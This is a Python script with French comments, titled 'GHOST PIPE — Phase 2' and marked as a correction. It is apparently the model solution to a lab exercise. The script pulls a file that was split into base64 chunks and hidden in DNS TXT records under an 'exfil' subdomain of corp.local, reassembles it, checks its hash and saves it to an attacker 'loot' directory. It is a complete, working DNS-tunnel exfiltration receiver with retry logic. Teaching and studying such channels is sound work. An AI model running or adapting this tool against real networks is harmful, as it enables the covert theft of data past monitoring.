#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
  GHOST PIPE — Phase 2 : Extraction DNS (Python)
  CORRECTION — Version avancée avec reprise sur erreur
═══════════════════════════════════════════════════════════════
"""

import subprocess
import base64
import hashlib
import sys
import os
import time

# ── Configuration ────────────────────────────────────────────
DNS_SERVER = "172.30.0.53"
ZONE = "corp.local"
OUTPUT_DIR = "/home/attacker/loot"
MAX_RETRIES = 3
RETRY_DELAY = 1  # secondes


def dig_txt(fqdn: str, server: str = DNS_SERVER) -> str | None:
    """Résout un enregistrement TXT via dig."""
    for attempt in range(MAX_RETRIES):
        try:
            result = subprocess.run(
                ["dig", "+short", "TXT", fqdn, f"@{server}"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and result.stdout.strip():
                # dig retourne les TXT entre guillemets
                return result.stdout.strip().strip('"')
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY)
        except subprocess.TimeoutExpired:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY)
    return None


def extract(subdomain: str = "exfil", output_dir: str = OUTPUT_DIR):
    """Pipeline complet d'extraction."""
    print("══════════════════════════════════════════════════")
    print("  GHOST PIPE — Extraction DNS TXT (Python)")
    print("══════════════════════════════════════════════════")
    print(f"  Serveur DNS   : {DNS_SERVER}")
    print(f"  Sous-domaine  : {subdomain}")
    print(f"  Sortie        : {output_dir}")
    print()

    os.makedirs(output_dir, exist_ok=True)

    # ── Étape 1 : Métadonnées ────────────────────────────────
    print("[1/4] Récupération des métadonnées...")
    meta_fqdn = f"chunk-000.{subdomain}.{ZONE}"
    meta_raw = dig_txt(meta_fqdn)

    if not meta_raw:
        print(f"[!] Pas de métadonnées trouvées à {meta_fqdn}")
        sys.exit(1)

    parts = meta_raw.split("|")
    if len(parts) != 4:
        print(f"[!] Format métadonnées invalide : {meta_raw}")
        sys.exit(1)

    filename, nb_chunks_str, expected_hash, orig_size_str = parts
    nb_chunks = int(nb_chunks_str)
    orig_size = int(orig_size_str)

    print(f"      Fichier     : {filename}")
    print(f"      Chunks      : {nb_chunks}")
    print(f"      SHA256      : {expected_hash}")
    print(f"      Taille orig : {orig_size} octets")

    # ── Étape 2 : Récupération des chunks ────────────────────
    print()
    print(f"[2/4] Récupération de {nb_chunks} chunks...")

    b64_parts = []
    errors = 0
    start_time = time.time()

    for i in range(1, nb_chunks + 1):
        num = f"{i:03d}"
        fqdn = f"chunk-{num}.{subdomain}.{ZONE}"
        chunk = dig_txt(fqdn)

        if chunk is None:
            print(f"\n      [!] Chunk {num} manquant !")
            errors += 1
            b64_parts.append("")  # placeholder
        else:
            b64_parts.append(chunk)
            pct = (i / nb_chunks) * 100
            print(f"\r      [{num}/{nb_chunks}] {pct:.0f}%", end="", flush=True)

    elapsed = time.time() - start_time
    print(f"\n      Terminé en {elapsed:.1f}s ({nb_chunks/elapsed:.1f} req/s)")

    if errors > 0:
        print(f"      ⚠️  {errors} chunk(s) manquant(s)")

    # ── Étape 3 : Réassemblage ───────────────────────────────
    print()
    print("[3/4] Réassemblage et décodage base64...")

    b64_data = "".join(b64_parts)
    try:
        raw_data = base64.b64decode(b64_data)
    except Exception as e:
        print(f"[!] Erreur de décodage base64 : {e}")
        sys.exit(1)

    output_path = os.path.join(output_dir, filename)
    with open(output_path, "wb") as f:
        f.write(raw_data)

    print(f"      Écrit : {output_path} ({len(raw_data)} octets)")

    # ── Étape 4 : Vérification d'intégrité ───────────────────
    print("[4/4] Vérification SHA256...")

    actual_hash = hashlib.sha256(raw_data).hexdigest()

    print()
    print("══════════════════════════════════════════════════")
    if actual_hash == expected_hash:
        print("  ✅ EXTRACTION RÉUSSIE — Intégrité vérifiée")
    else:
        print("  ⚠️  HASH NON CONCORDANT — fichier corrompu ?")
        print(f"      Attendu : {expected_hash}")
        print(f"      Obtenu  : {actual_hash}")
    print("══════════════════════════════════════════════════")
    print(f"  Fichier : {output_path}")
    print(f"  Taille  : {len(raw_data)} octets (attendu: {orig_size})")
    print("══════════════════════════════════════════════════")


if __name__ == "__main__":
    subdomain = sys.argv[1] if len(sys.argv) > 1 else "exfil"
    outdir = sys.argv[2] if len(sys.argv) > 2 else OUTPUT_DIR

    extract(subdomain, outdir)
